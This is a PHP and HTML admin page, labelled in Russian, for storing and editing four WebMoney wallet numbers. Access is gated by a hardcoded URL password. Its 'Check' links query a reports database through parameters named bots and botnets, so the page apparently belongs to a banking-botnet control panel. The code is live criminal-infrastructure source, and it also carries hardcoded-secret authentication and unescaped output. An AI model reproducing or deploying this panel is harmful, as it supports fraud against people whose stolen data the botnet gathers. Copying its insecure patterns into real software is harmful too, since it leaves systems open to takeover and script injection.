
     <style type="text/css"> html, body {
     background: #22659c ; 
     background-attachment: fixed; 
     background-repeat: no-repeat; 
     background-position: top center;}

       </style>

  <div align="left" ><img src="images/webmoney.png" width=220 /></div>
  <br>
   <div align="left" ><font color='#ffffff'>Настройка WM-кошельков:</font></div>
<br>
<?php
$result='';
if($_GET['login']==="toomuchmoneyintheweb")
{

include('system/config.php');
mysql_connect($config['mysql_host'], $config['mysql_user'], $config['mysql_pass']) or die("LOL"); 
mysql_select_db($config['mysql_db']) or die("LOL");
    if(empty($_POST))
	    {
	    
		    if(isset($_GET['ok']))
	            {
		            $result = "Кошельки обновлены!";	
		        }
		    if(isset($_GET['error']))
	            {
		            $result = "Длина одного из кошельков не верная.";	
		        }
		    $sql_wmz = "SELECT `wmz` FROM `webmoney` WHERE 1";
			$sql_wmz_go = mysql_query($sql_wmz);
			$wmz_array = mysql_fetch_row($sql_wmz_go);
			if($wmz_array === false )
			    {
				    $wmz = "Z123456789012";
					$wmr1 = "R123456789012";
					$wmu1 = "U123456789012";
					$wmb1 = "B123456789012";
				    $pre_wmz = "INSERT INTO `webmoney` (`wmz`, `wmr`, `wmu`, `wmb`) VALUES ('$wmz', '$wmr1', '$wmu1', '$wmb1')";
					$pre_wmz_go = mysql_query($pre_wmz);
				}
			    else
				{
				    $wmz = $wmz_array[0];
				}
		    $sql_wmr = "SELECT `wmr` FROM `webmoney` WHERE 1";
			$sql_wmr_go = mysql_query($sql_wmr);
			$wmr_array = mysql_fetch_row($sql_wmr_go);
			$wmr = $wmr_array[0];
		    $sql_wmu = "SELECT `wmu` FROM `webmoney` WHERE 1";
			$sql_wmu_go = mysql_query($sql_wmu);
			$wmu_array = mysql_fetch_row($sql_wmu_go);
			$wmu = $wmu_array[0];
		    $sql_wmb = "SELECT `wmb` FROM `webmoney` WHERE 1";
			$sql_wmb_go = mysql_query($sql_wmb);
			$wmb_array = mysql_fetch_row($sql_wmb_go);
			$wmb = $wmb_array[0];


				
		    $form = "
			         <form method='post' action='wm.php?login=toomuchmoneyintheweb'> 
			      
					<font color='#ffffff'><b>WMZ</b></font>
					 <input type='text' name='wmz' size='20' maxlength='13' value='$wmz'>
					 <br>
					 <font color='#ffffff'><b>WMR</b></font>
					 <input type='text' name='wmr' size='20' maxlength='13' value='$wmr'>
					 <br>
					<font color='#ffffff'><b>WMU</b></font>
					 <input type='text' name='wmu' size='20' maxlength='13' value='$wmu'>
					 <br>
					 <font color='#ffffff'><b>WMB</b></font>
					 <input type='text' name='wmb' size='20' maxlength='13' value='$wmb'>
					 <br>
					 <input name='Submit' type=submit size='width:100px' value='Сохранить'>
					 <br>
			         <div><font color='#00000'>$result</font></div>
			         
			         
                     </form>";
                   
			echo $form;
		}
		else
		{		
		    $sql_wmz = "SELECT `wmz` FROM `webmoney` WHERE 1";
			$sql_wmz_go = mysql_query($sql_wmz);
			$wmz_array = mysql_fetch_row($sql_wmz_go);
            $wmz_do = $wmz_array[0];			
		    $sql_wmr = "SELECT `wmr` FROM `webmoney` WHERE 1";
			$sql_wmr_go = mysql_query($sql_wmr);
			$wmr_array = mysql_fetch_row($sql_wmr_go);
			$wmr_do = $wmr_array[0];
		    $sql_wmu = "SELECT `wmu` FROM `webmoney` WHERE 1";
			$sql_wmu_go = mysql_query($sql_wmu);
			$wmu_array = mysql_fetch_row($sql_wmu_go);
			$wmu_do = $wmu_array[0];
		    $sql_wmb = "SELECT `wmb` FROM `webmoney` WHERE 1";
			$sql_wmb_go = mysql_query($sql_wmb);
			$wmb_array = mysql_fetch_row($sql_wmb_go);
			$wmb_do = $wmb_array[0];		 
		 
		    $wmz = mysql_real_escape_string($_POST['wmz']);
			$wmr = mysql_real_escape_string($_POST['wmr']);
			$wmu = mysql_real_escape_string($_POST['wmu']);
			$wmb = mysql_real_escape_string($_POST['wmb']);
			if(strlen($wmz) === 13)
			    {
				}
				else
				{
					 header("Location: wm.php?login=toomuchmoneyintheweb&error=1");
					 exit;
				}
			if(strlen($wmr) === 13)
			    {
				}
				else
				{
					 header("Location: wm.php?login=toomuchmoneyintheweb&error=1");
					 exit;
				}
			if(strlen($wmu) === 13)
			    {
				}
				else
				{
					 header("Location: wm.php?login=toomuchmoneyintheweb&error=1");
					 exit;
				}
			if(strlen($wmb) === 13)
			    {
				}
				else
				{
					 header("Location: wm.php?login=toomuchmoneyintheweb&error=1");
					 exit;
				}
			$up_wm = "UPDATE `webmoney` SET `wmz`='$wmz', `wmr`='$wmr', `wmu`='$wmu', `wmb`='$wmb' WHERE  `wmz`='$wmz_do' AND `wmr`='$wmr_do' AND `wmu`='$wmu_do' AND `wmb`='$wmb_do' LIMIT 1;";
			$up_go = mysql_query($up_wm);
			header("Location: wm.php?login=toomuchmoneyintheweb&ok=1");
		}
		
		
}
else{echo "<font color='red'><b>Не авторизирован</b></font>", "<BR>","<BR>","<BR>" ;}

?>

<div align="left" ><img src="images/webmoneychk.png" width=220 /></div>
<br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $wmz; ?>&blt=0" target="blank"><img src="https://my.webmoney.ru/css/themes/webmoney/wmz.png" ><font color='#ffffff'><b>Check WMZ</b></font></a></div>
					 <br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $wmr; ?>&blt=0" target="blank"><img src="https://my.webmoney.ru/css/themes/webmoney/wmr.png" ><font color='#ffffff'><b>Check WMR</b></font></div>
					 <br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $wmu; ?>&blt=0" target="blank"><img src="https://my.webmoney.ru/css/themes/webmoney/wmu.png" ><font color='#ffffff'><b>Check WMU</b></font></div>
					 <br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $wmb; ?>&blt=0" target="blank"><img src="https://my.webmoney.ru/css/themes/webmoney/wmb.png" ><font color='#ffffff'><b>Check WMB</b></font></div>


</body>
</html>
